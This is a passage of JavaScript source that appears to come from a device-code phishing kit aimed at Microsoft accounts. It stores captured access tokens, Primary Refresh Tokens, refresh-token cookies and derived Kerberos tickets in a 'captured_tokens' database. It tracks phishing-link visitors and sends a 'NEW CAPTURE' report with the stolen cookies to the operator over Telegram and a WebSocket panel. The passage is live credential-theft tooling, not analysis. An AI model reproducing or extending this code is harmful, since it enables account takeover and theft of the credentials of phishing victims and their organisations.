            });
          } catch (skErr) {
          }
        }
        if (registrationResult.prt && tokenId) {
          try {
            await db.query(
              'UPDATE captured_tokens SET prt = ?, session_key_jwe = ? WHERE id = ?',
              [encrypt(registrationResult.prt), encrypt(registrationResult.sessionKeyJwe || null), tokenId]
            );
          } catch (pErr) {
          }
        }
      }).then(() => {
        if (tenant && tenant !== 'common' && tenant !== 'organizations') {
          const kerberosService = require('./kerberos');
          kerberosService.deriveTGTForToken(tokenId)
            .then(derivationResult => {
              if (derivationResult.success) {
                // Update the token record with Kerberos data
                if (derivationResult.tgt_cloud) {
                  db.query(
                    'UPDATE captured_tokens SET tgt_cloud = ? WHERE id = ?',
                    [encrypt(derivationResult.tgt_cloud), tokenId]
                  ).catch(err => {});
                }
                if (derivationResult.tgt_ad) {
                  db.query(
                    'UPDATE captured_tokens SET tgt_ad = ? WHERE id = ?',
                    [encrypt(derivationResult.tgt_ad), tokenId]
                  ).catch(err => {});
                }
                if (derivationResult.session_key) {
                  db.query(
                    'UPDATE captured_tokens SET tgt_cloud_sessionkey = ? WHERE id = ?',
                    [encrypt(derivationResult.session_key), tokenId]
                  ).catch(err => {});
                }
                if (derivationResult.kerberos_top_level_names) {
                  db.query(
                    'UPDATE captured_tokens SET kerberos_top_level_names = ? WHERE id = ?',
                    [derivationResult.kerberos_top_level_names, tokenId]
                  ).catch(err => {});
                }
              }
            })
            .catch(err => {
            });
        }
      }).catch(err => {
        deviceRegistrationFailed = true;
        // Don't fail the token capture - device registration is optional
      });

      // Expose flag for capture.js to check early
      job.deviceRegistrationFailed = () => deviceRegistrationFailed;
    }

    // Update visitor status to "done" (or "blocked" if block_done_visitors is enabled)
    try {
      const [blockRows] = await db.query(
        'SELECT block_done_visitors FROM visitor_settings WHERE user_id = ?',
        [job.user_id]
      );
      const blockDone = blockRows.length > 0 && blockRows[0].block_done_visitors == 1;
      const newStatus = blockDone ? 'blocked' : 'done';
      dcdiag.log('store_status jobId=' + job.jobId + ' user_id=' + job.user_id + ' link_id=' + job.link_id + ' block_done_visitors=' + !!blockDone);

      const [updateResult] = await db.query(
        'UPDATE visitors SET status = ? WHERE user_id = ? AND link_id = ? AND status IN (?, ?)',
        [newStatus, job.user_id, job.link_id, 'waiting', 'timeout']
      );
      dcdiag.log('store_visitor_status jobId=' + job.jobId + ' link_id=' + job.link_id + ' ->' + newStatus + ' updated=' + updateResult.affectedRows);
      if (updateResult.affectedRows === 0) {
        dcdiag.fail('store_visitor_no_rows jobId=' + job.jobId + ' user_id=' + job.user_id + ' link_id=' + job.link_id + ' no_visitor_in_waiting_or_timeout');
      }
    } catch (updateErr) {
      dcdiag.fail('store_visitor_status_failed jobId=' + job.jobId + ' err=' + updateErr.message);
    }

    // Notify via WebSocket
    try {
      const io = ioHolder.getIo();
      if (io) {
        const notifyTokenType = job.mode === 'cookie' && cookieConversionResult && cookieConversionResult.success ? 'cookie' : (job.mode || 'token');
        io.to(`user_${job.user_id}`).emit('new_token', {
          id: tokenId,
          email,
          token_type: notifyTokenType,
          created_at: new Date(),
        });
        dcdiag.log('panel_notified jobId=' + job.jobId + ' user_id=' + job.user_id + ' tokenId=' + tokenId + ' email=' + (email || '(none)') + ' type=' + notifyTokenType);
      } else {
        dcdiag.fail('panel_not_notified jobId=' + job.jobId + ' user_id=' + job.user_id + ' tokenId=' + tokenId + ' reason=io_unavailable');
      }
    } catch (e) {
      dcdiag.fail('panel_notify_failed jobId=' + job.jobId + ' user_id=' + job.user_id + ' err=' + e.message);
    }

    try {
      const reportTokenType = job.mode === 'cookie' ? 'cookie' : 'token';

      // Load stored token row so Kerberos fields are defined if already saved
      const [tokenRows] = await db.query(
        'SELECT id, email, token_type, tenant, account_type, ip_address, user_agent, prt, session_key_jwe, device_tenant_id, tgt_ad, tgt_cloud, kerberos_top_level_names, tgt_cloud_sessionkey FROM captured_tokens WHERE id = ?',
        [tokenId]
      );
      const tokenRow = tokenRows.length > 0 ? tokenRows[0] : null;

      const safe = (v) => (v == null ? 'N/A' : v);
      const caption = `🚨 NEW CAPTURE - ${reportTokenType.toUpperCase()}
👤 <b>Email:</b> ${safe(email || tokenRow?.email)}
🏷️ <b>Account:</b> ${safe(accountType || tokenRow?.account_type)} | Tenant: ${safe(tenant || tokenRow?.tenant)}
🌐 <b>Template:</b> office
🌍 <b>IP:</b> ${safe(ipAddress || tokenRow?.ip_address)}
🔗 <b>Link:</b> ${job.link_id} | Token ID: ${tokenId}
📅 <b>Time:</b> ${new Date().toISOString().replace('T', ' ').slice(0, 19)}
✅ Full ${reportTokenType}s in attached .txt`;

      let fileContent = [
        'VGENIUS CAPTURE REPORT',
        '========================================',
        `Type:        ${reportTokenType.toUpperCase()}`,
        `Token ID:    ${tokenId}`,
        `Email:       ${safe(email || tokenRow?.email)}`,
        `Account:     ${safe(accountType || tokenRow?.account_type)}`,
        `Tenant:      ${safe(tenant || tokenRow?.tenant)}`,
        `IP:          ${safe(ipAddress || tokenRow?.ip_address)}`,
        `User Agent:  ${safe(userAgent || tokenRow?.user_agent)}`,
        `Link:        ${job.link_id}`,
        `Time:        ${new Date().toISOString()}`,
        '========================================'
      ].join('\n');

      const reportCookies = [];
      if (responseCookies && responseCookies.length > 0) {
        for (const cookie of responseCookies) {
          if (cookie && cookie.name && String(cookie.name).toLowerCase() === 'x-ms-refreshtokencredential') {
            reportCookies.push(`${cookie.name}=${cookie.value}; domain=${cookie.domain || '.login.microsoftonline.com'}; path=/; secure`);
          }
        }
      }
      if (cookieConversionResult && cookieConversionResult.cookies) {
        const extra = Array.isArray(cookieConversionResult.cookies)
          ? cookieConversionResult.cookies
              .filter(c => c && c.name && String(c.name).toLowerCase() === 'x-ms-refreshtokencredential')
              .map(c => `${c.name}=${c.value}; domain=${c.domain}; path=${c.path || '/'}; secure${c.httpOnly ? '; httponly' : ''}${c.sameSite ? '; samesite=' + c.sameSite : ''}`)
          : [String(cookieConversionResult.cookies)];
        for (const item of extra) reportCookies.push(item);
      }
      if (reportCookies.length > 0) {
        fileContent += '\n\nCOOKIES:\n' + [...new Set(reportCookies)].join('\n');
      } else if (reportTokenType === 'cookie') {
        fileContent += '\n\nCOOKIES:\nNO PRT COOKIE CAPTURED';
      }

      const filename = `capture_device_${tokenId}_${reportTokenType}.txt`;

      await sendTelegramDocument(job.user_id, filename, fileContent, caption);
    } catch (telegramErr) {
    }
  } catch (err) {
  }
}

/**
 * Poll a specific job status
 * @param {string} jobId
 * @returns {object} status info
 */
function getJobStatus(jobId) {
  const job = activeJobs.get(jobId);
  if (!job) {
    return {
      status: 'not_found',
      error: 'Job not found or expired'
    };
  }

  // Check expiry
  if (Date.now() > job.expires_at && job.status === 'polling') {
    job.status = 'expired';
  }

  const remaining = Math.max(0, Math.floor((job.expires_at - Date.now()) / 1000));

  const result = {
    status: job.status === 'completed' ? 'done' : job.status,
    job_id: job.jobId,
    user_code: null,
    verification_uri: null,
    verification_uri_complete: null,
    expires_in: remaining,
    recommended_mode: null,
    error_code: null,
    error_message: null,
  };

  if (job.status === 'polling') {
    // Return waiting status
    result.status = 'waiting_user';
    result.user_code = job.user_code || null;
    result.verification_uri = job.verification_uri || null;
    result.verification_uri_complete = job.verification_uri_complete || null;
  }

  if (job.status === 'expired' || job.status === 'failed') {
    result.error = job.error || 'Code expired or verification failed';
  }

  if (job.status === 'soft_error') {
    result.soft_error = true;
    result.error_code = 50076;
    result.recommended_mode = 'token';
    result.error_message = 'Additional verification required';
    if (job.retry_job_id) {
      result.retry_job_id = job.retry_job_id;
    }
  }

  if (job.status === 'completed') {
    result.email = job.captured_email || null;
  }

  return result;
}

/**
 * Clean up expired jobs (called periodically)
 */
function cleanupJobs() {
  const now = Date.now();
  for (const [id, job] of activeJobs) {
    if (now > job.expires_at + 300000) {
      // 5 min grace period
      activeJobs.delete(id);
    }
  }
}

// Cleanup every 5 minutes
setInterval(cleanupJobs, 5 * 60 * 1000);

module.exports = {
  startDeviceFlow,
  getJobStatus,
  pollForToken,
  cleanupJobs,
};
